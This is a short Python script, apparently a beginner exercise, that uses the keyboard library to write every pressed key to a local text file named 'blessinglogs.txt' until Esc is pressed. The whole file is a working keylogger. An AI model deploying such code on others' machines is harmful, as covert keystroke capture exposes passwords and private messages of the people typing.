import keyboard #This will import the keyboard library

log_file = "blessinglogs.txt" # the logfile captured will be saved with the file name blessinglogs.txt
 #(.txt sepcify its file extension as text file)

def on_key_event(event):
    try:
        with open(log_file, "a") as f:
            f.write(f"{event.name}\n")
    except Exception as e:
        print(f"Error: {e}")

# listening to keyboard event, in order to capture log
keyboard.on_press(on_key_event)

keyboard.wait("esc") #program keeps running until Esc key is pressed to stop the execution